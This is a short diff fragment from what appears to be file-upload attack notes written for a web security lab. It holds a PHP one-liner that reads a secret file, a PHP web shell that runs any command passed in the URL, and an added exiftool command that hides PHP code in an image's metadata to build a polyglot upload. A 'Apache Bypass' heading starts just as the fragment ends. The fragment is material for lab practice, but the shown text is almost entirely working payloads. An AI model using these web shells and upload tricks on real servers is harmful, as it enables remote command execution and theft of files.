@@ -1,5 +1,6 @@
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 <?php system($_GET['cmd']); ?>
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" hacker.jpg -o polyglot.php
 
 #Apache Bypass
 Before:
